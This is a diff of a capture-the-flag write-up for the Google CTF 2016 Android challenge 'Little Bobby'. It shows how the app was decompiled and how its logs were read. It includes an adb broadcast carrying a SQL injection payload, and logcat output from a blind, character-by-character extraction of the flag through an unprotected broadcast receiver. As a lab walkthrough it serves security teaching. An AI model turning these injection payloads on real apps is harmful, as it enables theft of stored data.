@@ -1,5 +1,32 @@
+---
+title: Google CTF 2016 - Little Bobby application
+description: ""
+tags:
+  - SQLite
+  - SQLi
+  - logcat
+  - logs
+  - intents
+  - adb
+  - broadcast
+  - GoogleCTF
+  - android
+keywords:
+  - android reversing
+  - ctf writeup
+  - GoogleCTF
+  - Google
+  - mobile writeups
+  - apk decompilation
+  - frida tool
+  - mobile security research
+canonical: https://lautarovculic.github.io/writeups/Google%20CTF%202016%20-%20Little%20Bobby%20application/
+---
+
 **Note**: For this challenge, we need install some things into our Android 5.1 device with Genymotion.
+
 For example, an **ARM Translator**.
+
 https://github.com/m9rco/Genymotion_ARM_Translation
 
 Download **APK**: https://lautarovculic.com/my_files/BobbyApplication_CTF.apk
@@ -16,9 +43,11 @@ We can see a **login form**. Let's decompile the content with **apktool**.
 apktool d BobbyApplication_CTF.apk
 ```
 And let's check the **source code** with **jadx** (GUI version)
+
 We can conclude that the **package name is** `bobbytables.ctf.myapplication`
 
 After create an **user** "asd" for test, I notice that an **database** is created `LocalDatabase.db`
+
 That the content is the following
 ```bash
 sqlite3 LocalDatabase.db
@@ -130,6 +159,7 @@ public class LocalDatabaseHelper extends SQLiteOpenHelper {
 ```
 
 Where in the method of the same class, we have some **query raw**.
+
 And there are so **legible**.
 
 Also, we can see that the **Log.d** are enabled and we can **inspect** the logs while the **app** is running and executing the code.
@@ -156,6 +186,7 @@ I/LatinIME(  737): Starting input. Cursor position = 5,5
 We can see output like `D/Does User exist( 1774): true` or `D/Does User exist( 1774): false`
 
 I create another user for a better understanding of the **DB** composition
+
 ![[littleBobby2.png]]
 
 We can see an **Intent** in the **LoginActivity** 
@@ -191,7 +222,6 @@ filter.addAction("com.bobbytables.ctf.myapplication_INTENT");
 LoginReceiver receiver = new LoginReceiver();  
 registerReceiver(receiver, filter);
 ```
-
 
 In the **LoginReceiver** class we have a **Broadcast Receiver** which return the result.
 ```java
@@ -246,20 +276,26 @@ adb shell 'am broadcast -a com.bobbytables.ctf.myapplication_INTENT -e username 
 Notice that the **output** from **logcat** is **Incorrect password**. Which means that the **user `"\" OR 1=1 --"` is valid**.
 
 So, now we just need **make** an **malicious** app that abuse broadcast and get the content via **ADB logcat**.
+
 Why we can do this?
+
 Because there are an **public Broadcast receiver**.
 ```java
 IntentFilter filter = new IntentFilter(); filter.addAction("com.bobbytables.ctf.myapplication_INTENT"); LoginReceiver receiver = new LoginReceiver(); registerReceiver(receiver, filter);
 ```
 
 This intent register an **receiver** that listening broadcast for the action `com.bobbytables.ctf.myapplication_INTENT`.
+
 So, this make that **every app installed in the device** can **send** an **broadcast** with this action.
 
 And, the **Broadcast Receiver** from **LoginReceiver** have some vulnerabilities, for example, this not validate which **app** coming the **Intent**.
+
 And the **Broadcast** don't have **output restrictions**. After of the **login process**, the **LoginReceiver** send a **new intent** (`com.bobbytables.ctf.myapplication_OUTPUTINTENT`) that is **another no restricted broadcast**. Which **any app installed** can **intercept the broadcast** for obtain the result of the operation.
 
 #### Note
+
 The intention of this **CTF** is get the of a way the **column** of the **database**.
+
 I reinstall the **app** for create a **admin** user in the **DB**
 ```bash
 adb pull /data/data//bobbytables.ctf.myapplication/databases/LocalDatabase.db
@@ -275,6 +311,7 @@ sqlite>
 ```
 
 So, the flag in my case is `608dc6110462ee35488edf83443fbbc3`.
+
 You can **create a admin user** but the **flag** will be **different** because we have a **salt** under **31337**
 ```java
  public long insert(String username, String password) {  
@@ -294,6 +331,7 @@ You can **create a admin user** but the **flag** will be **different** because w
 ```
 
 So, the app that we need create, need **take** the **flag**.
+
 You can create an **app** for **lollipop** android version (5.1) and here is the code
 ```java
 package com.example.exploitapp;  
@@ -387,6 +425,5 @@ D/Username(10176): " OR substr(flag, 84, 1) = "3" --
 D/Result  (10176): Incorrect password
 D/Exploit (11501): Here's your flag: 608dc6110462ee35488edf83443fbbc3
 ```
-
 
 I hope you found it useful (:
